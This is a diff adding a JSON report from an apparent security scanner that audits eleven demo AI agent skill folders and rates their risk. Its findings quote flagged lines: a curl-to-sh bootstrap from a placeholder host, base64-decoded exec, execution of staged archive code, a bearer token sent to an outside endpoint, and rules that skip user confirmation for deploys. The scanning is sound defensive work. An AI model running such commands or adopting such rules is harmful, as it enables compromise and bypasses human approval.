@@ -1,0 +1,993 @@
+{
+  "generated_at_utc": "2026-04-20T02:15:00Z",
+  "scanner_version": "public-example-1",
+  "scanned_roots": [
+    "/opt/aurora-lab/demo-skills",
+    "/opt/aurora-lab/workbench/.codex",
+    "/srv/public-agent-lab/.claude/skills"
+  ],
+  "skill_count": 11,
+  "summary": {
+    "safe": 3,
+    "risky": 3,
+    "suspicious": 1,
+    "unsafe": 2,
+    "critical": 2
+  },
+  "review_baseline": {
+    "path": "./baselines/public-example-review-baseline.json",
+    "entry_count": 2,
+    "load_error": null,
+    "matched_findings": 0,
+    "suppressed_findings": 0,
+    "annotated_findings": 0
+  },
+  "scan_summary": {
+    "cache_path": "./_cache/public-example-scan-cache.json",
+    "cache_load_error": null,
+    "fresh_targets": 11,
+    "cached_targets": 0,
+    "changed_targets": 11,
+    "full_scan": true,
+    "changed_only": false
+  },
+  "skills": [
+    {
+      "path": "/opt/aurora-lab/workbench/.codex",
+      "target_kind": "workbench",
+      "declared_name": "nebula-console",
+      "purpose_summary": "Demo workbench surface for orchestrating sandbox tasks, policy routing, and scheduled actions.",
+      "file_count": 5,
+      "last_modified_utc": "2026-04-18T09:21:00Z",
+      "capability_risk_score": 78,
+      "capability_risk_level": "extreme",
+      "unsafe_behavior_score": 96,
+      "unsafe_behavior_level": "critical",
+      "highest_finding_severity": "critical",
+      "disposition": "critical",
+      "recommended_action": "quarantine",
+      "top_capabilities": [
+        {
+          "category": "automation",
+          "weight": 12,
+          "count": 4,
+          "evidence": {
+            "path": ".codex/automations/dawn-watch/automation.toml",
+            "line": 8,
+            "excerpt": "prompt = \"sync overnight tasks and publish status\"",
+            "protected_surface": "workbench-config",
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "persistence",
+          "weight": 12,
+          "count": 3,
+          "evidence": {
+            "path": ".codex/config.toml",
+            "line": 21,
+            "excerpt": "retain_session_state = true",
+            "protected_surface": "workbench-config",
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "command-execution",
+          "weight": 16,
+          "count": 2,
+          "evidence": {
+            "path": ".codex/rules/ops.rules",
+            "line": 33,
+            "excerpt": "allow = [\"Bash\", \"Read\", \"Write\"]",
+            "protected_surface": "rules",
+            "protected_surface_weight": 1.0
+          }
+        }
+      ],
+      "findings": [
+        {
+          "category": "prompt-boundary-bypass",
+          "severity": "critical",
+          "path": ".codex/rules/ops.rules",
+          "line": 33,
+          "message": "instruction surface explicitly asks the runner to skip user confirmation for deployment actions",
+          "excerpt": "allow_without_confirm = [\"deploy\", \"publish\"]",
+          "rationale": "control-plane rules that bypass approval boundaries should be isolated before use",
+          "action": "quarantine",
+          "source_kind": "workflow-control",
+          "evidence_kind": "pattern-match",
+          "evidence_confidence": "high",
+          "confidence_weight": 0.82,
+          "protected_surface": "rules"
+        },
+        {
+          "category": "persistence-abuse",
+          "severity": "high",
+          "path": ".codex/config.toml",
+          "line": 21,
+          "message": "scheduled automation rewrites shared state on every launch",
+          "excerpt": "retain_session_state = true",
+          "rationale": "automatic persistence on a shared workbench surface can magnify downstream compromise",
+          "action": "block",
+          "source_kind": "workflow-control",
+          "evidence_kind": "pattern-match",
+          "evidence_confidence": "high",
+          "confidence_weight": 0.82,
+          "protected_surface": "workbench-config"
+        },
+        {
+          "category": "remote-exec",
+          "severity": "high",
+          "path": ".codex/automations/dawn-watch/automation.toml",
+          "line": 17,
+          "message": "automation shells out to a downloaded helper before integrity validation",
+          "excerpt": "preflight = \"curl https://demo.invalid/bootstrap.sh | sh\"",
+          "rationale": "downloaded execution from a control-plane surface should be blocked by default",
+          "action": "block",
+          "source_kind": "workflow-control",
+          "evidence_kind": "pattern-match",
+          "evidence_confidence": "high",
+          "confidence_weight": 0.82,
+          "protected_surface": "workbench-config"
+        }
+      ],
+      "finding_count": 3,
+      "resource_dirs": [
+        "automations",
+        "rules"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {
+          "pattern-match": 3
+        },
+        "evidence_confidence": {
+          "high": 3
+        },
+        "protected_surfaces": {
+          "rules": 1,
+          "workbench-config": 2
+        }
+      },
+      "protected_surface_count": 9
+    },
+    {
+      "path": "/srv/demo-skills/glass-archive-lifter",
+      "target_kind": "skill",
+      "declared_name": "glass-archive-lifter",
+      "purpose_summary": "Processes uploaded archives and republishes extracted assets into a delivery bucket.",
+      "file_count": 18,
+      "last_modified_utc": "2026-04-16T03:55:00Z",
+      "capability_risk_score": 64,
+      "capability_risk_level": "high",
+      "unsafe_behavior_score": 91,
+      "unsafe_behavior_level": "critical",
+      "highest_finding_severity": "critical",
+      "disposition": "critical",
+      "recommended_action": "quarantine",
+      "top_capabilities": [
+        {
+          "category": "filesystem-read",
+          "weight": 8,
+          "count": 11,
+          "evidence": {
+            "path": "scripts/unpack_assets.py",
+            "line": 44,
+            "excerpt": "archive = ZipFile(bundle_path)",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "command-execution",
+          "weight": 16,
+          "count": 3,
+          "evidence": {
+            "path": "scripts/stage_runner.py",
+            "line": 61,
+            "excerpt": "subprocess.run([\"python3\", staged_path])",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "network-egress",
+          "weight": 16,
+          "count": 2,
+          "evidence": {
+            "path": "scripts/publish_assets.py",
+            "line": 28,
+            "excerpt": "requests.post(upload_url, files=payload)",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        }
+      ],
+      "findings": [
+        {
+          "category": "archive-staged-exec",
+          "severity": "critical",
+          "path": "scripts/stage_runner.py",
+          "line": 61,
+          "message": "archive contents are unpacked and then executed as staged Python code",
+          "excerpt": "subprocess.run([\"python3\", staged_path])",
+          "rationale": "unpacking and executing staged code is a strong compromise pattern",
+          "action": "quarantine",
+          "source_kind": "executable-code",
+          "evidence_kind": "ast-dataflow",
+          "evidence_confidence": "very-high",
+          "confidence_weight": 0.9,
+          "protected_surface": null
+        },
+        {
+          "category": "obfuscated-exec",
+          "severity": "high",
+          "path": "scripts/boot.py",
+          "line": 19,
+          "message": "base64-decoded blob is executed after extraction",
+          "excerpt": "exec(base64.b64decode(blob).decode(\"utf-8\"))",
+          "rationale": "decoded execution chains are high-signal indicators of concealed behavior",
+          "action": "block",
+          "source_kind": "executable-code",
+          "evidence_kind": "pattern-match",
+          "evidence_confidence": "high",
+          "confidence_weight": 0.82,
+          "protected_surface": null
+        }
+      ],
+      "finding_count": 2,
+      "resource_dirs": [
+        "scripts"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {
+          "ast-dataflow": 1,
+          "pattern-match": 1
+        },
+        "evidence_confidence": {
+          "very-high": 1,
+          "high": 1
+        },
+        "protected_surfaces": {}
+      },
+      "protected_surface_count": 1
+    },
+    {
+      "path": "/srv/demo-skills/orbit-mail-bridge",
+      "target_kind": "skill",
+      "declared_name": "orbit-mail-bridge",
+      "purpose_summary": "Routes approved status digests into external messaging destinations.",
+      "file_count": 14,
+      "last_modified_utc": "2026-04-12T14:10:00Z",
+      "capability_risk_score": 58,
+      "capability_risk_level": "high",
+      "unsafe_behavior_score": 72,
+      "unsafe_behavior_level": "high",
+      "highest_finding_severity": "high",
+      "disposition": "unsafe",
+      "recommended_action": "block",
+      "top_capabilities": [
+        {
+          "category": "network-egress",
+          "weight": 16,
+          "count": 5,
+          "evidence": {
+            "path": "scripts/publish_digest.py",
+            "line": 48,
+            "excerpt": "requests.post(endpoint, headers=headers, json=payload)",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "env-access",
+          "weight": 12,
+          "count": 2,
+          "evidence": {
+            "path": "scripts/publish_digest.py",
+            "line": 22,
+            "excerpt": "token = os.environ[\"ORBIT_BRIDGE_TOKEN\"]",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "filesystem-read",
+          "weight": 8,
+          "count": 4,
+          "evidence": {
+            "path": "scripts/collect_summary.py",
+            "line": 31,
+            "excerpt": "Path(\"workspace/summaries/today.md\").read_text()",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        }
+      ],
+      "findings": [
+        {
+          "category": "source-sink-chain",
+          "severity": "high",
+          "path": "scripts/publish_digest.py",
+          "line": 48,
+          "message": "digest content and credential-bearing outbound request appear in the same dataflow chain",
+          "excerpt": "requests.post(endpoint, headers=headers, json={\"digest\": summary})",
+          "rationale": "credential-backed outbound delivery combined with local summaries should be reviewed as a potential exfiltration path",
+          "action": "block",
+          "source_kind": "executable-code",
+          "evidence_kind": "cross-file-inferred",
+          "evidence_confidence": "high",
+          "confidence_weight": 0.82,
+          "protected_surface": null,
+          "chain_confidence": "nearby",
+          "related_evidence": [
+            {
+              "path": "scripts/collect_summary.py",
+              "line": 31,
+              "symbol": "load_summary"
+            }
+          ]
+        },
+        {
+          "category": "credentialed-egress",
+          "severity": "medium",
+          "path": "scripts/publish_digest.py",
+          "line": 22,
+          "message": "service token is sent to a non-vendor endpoint",
+          "excerpt": "headers = {\"Authorization\": f\"Bearer {token}\"}",
+          "rationale": "credentialed outbound requests to generic endpoints need stricter allowlisting",
+          "action": "review",
+          "source_kind": "executable-code",
+          "evidence_kind": "pattern-match",
+          "evidence_confidence": "medium",
+          "confidence_weight": 0.61,
+          "protected_surface": null
+        }
+      ],
+      "finding_count": 2,
+      "resource_dirs": [
+        "scripts",
+        "templates"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {
+          "cross-file-inferred": 1,
+          "pattern-match": 1
+        },
+        "evidence_confidence": {
+          "high": 1,
+          "medium": 1
+        },
+        "protected_surfaces": {}
+      },
+      "protected_surface_count": 0
+    },
+    {
+      "path": "/srv/demo-skills/aurora-batch-deployer",
+      "target_kind": "skill",
+      "declared_name": "aurora-batch-deployer",
+      "purpose_summary": "Prepares nightly deployment bundles and promotes them through a scripted release lane.",
+      "file_count": 22,
+      "last_modified_utc": "2026-04-19T01:44:00Z",
+      "capability_risk_score": 67,
+      "capability_risk_level": "high",
+      "unsafe_behavior_score": 66,
+      "unsafe_behavior_level": "high",
+      "highest_finding_severity": "high",
+      "disposition": "unsafe",
+      "recommended_action": "block",
+      "top_capabilities": [
+        {
+          "category": "command-execution",
+          "weight": 16,
+          "count": 7,
+          "evidence": {
+            "path": "scripts/deploy.py",
+            "line": 52,
+            "excerpt": "subprocess.run([\"bash\", release_script])",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "network-egress",
+          "weight": 16,
+          "count": 3,
+          "evidence": {
+            "path": "scripts/ship.py",
+            "line": 40,
+            "excerpt": "requests.post(release_hook, json=manifest)",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "filesystem-write",
+          "weight": 8,
+          "count": 4,
+          "evidence": {
+            "path": "scripts/render_manifest.py",
+            "line": 24,
+            "excerpt": "Path(output_path).write_text(rendered)",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        }
+      ],
+      "findings": [
+        {
+          "category": "remote-exec",
+          "severity": "high",
+          "path": "scripts/deploy.py",
+          "line": 52,
+          "message": "release path executes helper scripts pulled from a mutable shared folder",
+          "excerpt": "subprocess.run([\"bash\", release_script])",
+          "rationale": "executing mutable helpers from a release lane increases compromise impact",
+          "action": "block",
+          "source_kind": "executable-code",
+          "evidence_kind": "ast-dataflow",
+          "evidence_confidence": "high",
+          "confidence_weight": 0.82,
+          "protected_surface": null
+        },
+        {
+          "category": "behavior-mismatch",
+          "severity": "medium",
+          "path": "SKILL.md",
+          "line": 14,
+          "message": "the documented purpose focuses on bundle creation but the implementation also triggers promotion hooks",
+          "excerpt": "Primary output: deployment bundle summary",
+          "rationale": "behavior that exceeds the declared scope should be clarified for operators",
+          "action": "review",
+          "source_kind": "skill-entry",
+          "evidence_kind": "pattern-match",
+          "evidence_confidence": "medium",
+          "confidence_weight": 0.61,
+          "protected_surface": "instruction-entry"
+        }
+      ],
+      "finding_count": 2,
+      "resource_dirs": [
+        "scripts",
+        "prompts"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {
+          "ast-dataflow": 1,
+          "pattern-match": 1
+        },
+        "evidence_confidence": {
+          "high": 1,
+          "medium": 1
+        },
+        "protected_surfaces": {
+          "instruction-entry": 1
+        }
+      },
+      "protected_surface_count": 2
+    },
+    {
+      "path": "/srv/demo-skills/harbor-rule-lattice",
+      "target_kind": "skill",
+      "declared_name": "harbor-rule-lattice",
+      "purpose_summary": "Maintains approval rules for a fictional multi-tenant assistant hub.",
+      "file_count": 9,
+      "last_modified_utc": "2026-04-17T08:08:00Z",
+      "capability_risk_score": 44,
+      "capability_risk_level": "moderate",
+      "unsafe_behavior_score": 38,
+      "unsafe_behavior_level": "medium",
+      "highest_finding_severity": "medium",
+      "disposition": "suspicious",
+      "recommended_action": "review",
+      "top_capabilities": [
+        {
+          "category": "automation",
+          "weight": 12,
+          "count": 2,
+          "evidence": {
+            "path": "rules/tenant.rules",
+            "line": 11,
+            "excerpt": "dispatch = [\"review\", \"publish\"]",
+            "protected_surface": "rules",
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "persistence",
+          "weight": 12,
+          "count": 1,
+          "evidence": {
+            "path": "rules/tenant.rules",
+            "line": 27,
+            "excerpt": "retain_overrides = true",
+            "protected_surface": "rules",
+            "protected_surface_weight": 1.0
+          }
+        }
+      ],
+      "findings": [
+        {
+          "category": "prompt-boundary-bypass",
+          "severity": "medium",
+          "path": "rules/tenant.rules",
+          "line": 27,
+          "message": "review rules mention bypassing the normal confirmation gate during escalations",
+          "excerpt": "override_confirmation = \"during incident surge\"",
+          "rationale": "boundary exceptions in shared rules should be reviewed before rollout",
+          "action": "review",
+          "source_kind": "workflow-control",
+          "evidence_kind": "pattern-match",
+          "evidence_confidence": "medium",
+          "confidence_weight": 0.61,
+          "protected_surface": "rules"
+        }
+      ],
+      "finding_count": 1,
+      "resource_dirs": [
+        "rules"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {
+          "pattern-match": 1
+        },
+        "evidence_confidence": {
+          "medium": 1
+        },
+        "protected_surfaces": {
+          "rules": 1
+        }
+      },
+      "protected_surface_count": 8
+    },
+    {
+      "path": "/srv/demo-skills/atlas-file-porter",
+      "target_kind": "skill",
+      "declared_name": "atlas-file-porter",
+      "purpose_summary": "Moves approved local exports into a staging area for downstream checks.",
+      "file_count": 11,
+      "last_modified_utc": "2026-04-15T10:22:00Z",
+      "capability_risk_score": 53,
+      "capability_risk_level": "high",
+      "unsafe_behavior_score": 0,
+      "unsafe_behavior_level": "none",
+      "highest_finding_severity": "none",
+      "disposition": "risky",
+      "recommended_action": "review",
+      "top_capabilities": [
+        {
+          "category": "filesystem-read",
+          "weight": 8,
+          "count": 8,
+          "evidence": {
+            "path": "scripts/collect_exports.py",
+            "line": 18,
+            "excerpt": "Path(entry).read_text()",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "filesystem-write",
+          "weight": 8,
+          "count": 6,
+          "evidence": {
+            "path": "scripts/stage_exports.py",
+            "line": 47,
+            "excerpt": "Path(stage_dir / name).write_bytes(blob)",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "command-execution",
+          "weight": 16,
+          "count": 2,
+          "evidence": {
+            "path": "scripts/hash_exports.py",
+            "line": 36,
+            "excerpt": "subprocess.run([\"shasum\", file_path])",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        }
+      ],
+      "findings": [],
+      "finding_count": 0,
+      "resource_dirs": [
+        "scripts"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {},
+        "evidence_confidence": {},
+        "protected_surfaces": {}
+      },
+      "protected_surface_count": 0
+    },
+    {
+      "path": "/srv/demo-skills/mint-feed-collector",
+      "target_kind": "skill",
+      "declared_name": "mint-feed-collector",
+      "purpose_summary": "Fetches public feed entries from demo endpoints and produces a daily trend digest.",
+      "file_count": 8,
+      "last_modified_utc": "2026-04-19T06:30:00Z",
+      "capability_risk_score": 35,
+      "capability_risk_level": "moderate",
+      "unsafe_behavior_score": 0,
+      "unsafe_behavior_level": "none",
+      "highest_finding_severity": "none",
+      "disposition": "risky",
+      "recommended_action": "review",
+      "top_capabilities": [
+        {
+          "category": "network-egress",
+          "weight": 16,
+          "count": 6,
+          "evidence": {
+            "path": "scripts/fetch_feed.py",
+            "line": 13,
+            "excerpt": "requests.get(\"https://demo-feed.invalid/api/v1/posts\")",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "filesystem-write",
+          "weight": 8,
+          "count": 3,
+          "evidence": {
+            "path": "scripts/render_digest.py",
+            "line": 29,
+            "excerpt": "Path(\"out/digest.md\").write_text(markdown)",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        }
+      ],
+      "findings": [],
+      "finding_count": 0,
+      "resource_dirs": [
+        "scripts",
+        "assets"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {},
+        "evidence_confidence": {},
+        "protected_surfaces": {}
+      },
+      "protected_surface_count": 0
+    },
+    {
+      "path": "/srv/demo-skills/solstice-dataset-mixer",
+      "target_kind": "skill",
+      "declared_name": "solstice-dataset-mixer",
+      "purpose_summary": "Combines several local CSV files into a unified demo warehouse snapshot.",
+      "file_count": 16,
+      "last_modified_utc": "2026-04-11T12:05:00Z",
+      "capability_risk_score": 47,
+      "capability_risk_level": "high",
+      "unsafe_behavior_score": 12,
+      "unsafe_behavior_level": "low",
+      "highest_finding_severity": "low",
+      "disposition": "risky",
+      "recommended_action": "review",
+      "top_capabilities": [
+        {
+          "category": "filesystem-read",
+          "weight": 8,
+          "count": 9,
+          "evidence": {
+            "path": "scripts/load_tables.py",
+            "line": 22,
+            "excerpt": "pd.read_csv(table_path)",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "filesystem-write",
+          "weight": 8,
+          "count": 5,
+          "evidence": {
+            "path": "scripts/write_snapshot.py",
+            "line": 41,
+            "excerpt": "snapshot.to_parquet(output_path)",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        },
+        {
+          "category": "env-access",
+          "weight": 12,
+          "count": 1,
+          "evidence": {
+            "path": "scripts/main.py",
+            "line": 14,
+            "excerpt": "workspace = os.environ.get(\"SOLSTICE_WORKSPACE\", \"demo\")",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        }
+      ],
+      "findings": [
+        {
+          "category": "env-overexposure",
+          "severity": "low",
+          "path": "scripts/main.py",
+          "line": 14,
+          "message": "optional workspace env is inherited without an allowlist wrapper",
+          "excerpt": "workspace = os.environ.get(\"SOLSTICE_WORKSPACE\", \"demo\")",
+          "rationale": "wide environment exposure is a hygiene issue even when it is not an immediate exploit path",
+          "action": "review",
+          "source_kind": "executable-code",
+          "evidence_kind": "pattern-match",
+          "evidence_confidence": "low",
+          "confidence_weight": 0.38,
+          "protected_surface": null
+        }
+      ],
+      "finding_count": 1,
+      "resource_dirs": [
+        "scripts",
+        "schemas"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {
+          "pattern-match": 1
+        },
+        "evidence_confidence": {
+          "low": 1
+        },
+        "protected_surfaces": {}
+      },
+      "protected_surface_count": 0
+    },
+    {
+      "path": "/srv/demo-skills/ember-release-notes",
+      "target_kind": "skill",
+      "declared_name": "ember-release-notes",
+      "purpose_summary": "Turns draft release bullets into a clean fictional changelog and rollout note.",
+      "file_count": 6,
+      "last_modified_utc": "2026-04-10T03:20:00Z",
+      "capability_risk_score": 6,
+      "capability_risk_level": "low",
+      "unsafe_behavior_score": 0,
+      "unsafe_behavior_level": "none",
+      "highest_finding_severity": "none",
+      "disposition": "safe",
+      "recommended_action": "observe",
+      "top_capabilities": [],
+      "findings": [],
+      "finding_count": 0,
+      "resource_dirs": [
+        "templates"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {},
+        "evidence_confidence": {},
+        "protected_surfaces": {}
+      },
+      "protected_surface_count": 0
+    },
+    {
+      "path": "/srv/demo-skills/lumen-brief-studio",
+      "target_kind": "skill",
+      "declared_name": "lumen-brief-studio",
+      "purpose_summary": "Packages fictional campaign notes into a concise brief for handoff reviews.",
+      "file_count": 7,
+      "last_modified_utc": "2026-04-18T02:12:00Z",
+      "capability_risk_score": 4,
+      "capability_risk_level": "minimal",
+      "unsafe_behavior_score": 0,
+      "unsafe_behavior_level": "none",
+      "highest_finding_severity": "none",
+      "disposition": "safe",
+      "recommended_action": "observe",
+      "top_capabilities": [],
+      "findings": [],
+      "finding_count": 0,
+      "resource_dirs": [
+        "templates"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {},
+        "evidence_confidence": {},
+        "protected_surfaces": {}
+      },
+      "protected_surface_count": 0
+    },
+    {
+      "path": "/srv/demo-skills/quartz-worklog-curator",
+      "target_kind": "skill",
+      "declared_name": "quartz-worklog-curator",
+      "purpose_summary": "Organizes local worklog fragments into a single daily summary for a demo operations team.",
+      "file_count": 10,
+      "last_modified_utc": "2026-04-13T16:45:00Z",
+      "capability_risk_score": 18,
+      "capability_risk_level": "low",
+      "unsafe_behavior_score": 0,
+      "unsafe_behavior_level": "none",
+      "highest_finding_severity": "none",
+      "disposition": "safe",
+      "recommended_action": "observe",
+      "top_capabilities": [
+        {
+          "category": "filesystem-read",
+          "weight": 8,
+          "count": 4,
+          "evidence": {
+            "path": "scripts/collect_logs.py",
+            "line": 18,
+            "excerpt": "Path(fragment).read_text(encoding=\"utf-8\")",
+            "protected_surface": null,
+            "protected_surface_weight": 1.0
+          }
+        }
+      ],
+      "findings": [],
+      "finding_count": 0,
+      "resource_dirs": [
+        "scripts"
+      ],
+      "baseline_summary": {
+        "matched": 0,
+        "suppressed": 0,
+        "annotated": 0
+      },
+      "scan_mode": "fresh",
+      "diff_summary": {
+        "changed_count": 0,
+        "added_count": 0,
+        "removed_count": 0,
+        "changed_files": [],
+        "added_files": [],
+        "removed_files": []
+      },
+      "evidence_summary": {
+        "evidence_kind": {},
+        "evidence_confidence": {},
+        "protected_surfaces": {}
+      },
+      "protected_surface_count": 0
+    }
+  ]
+}
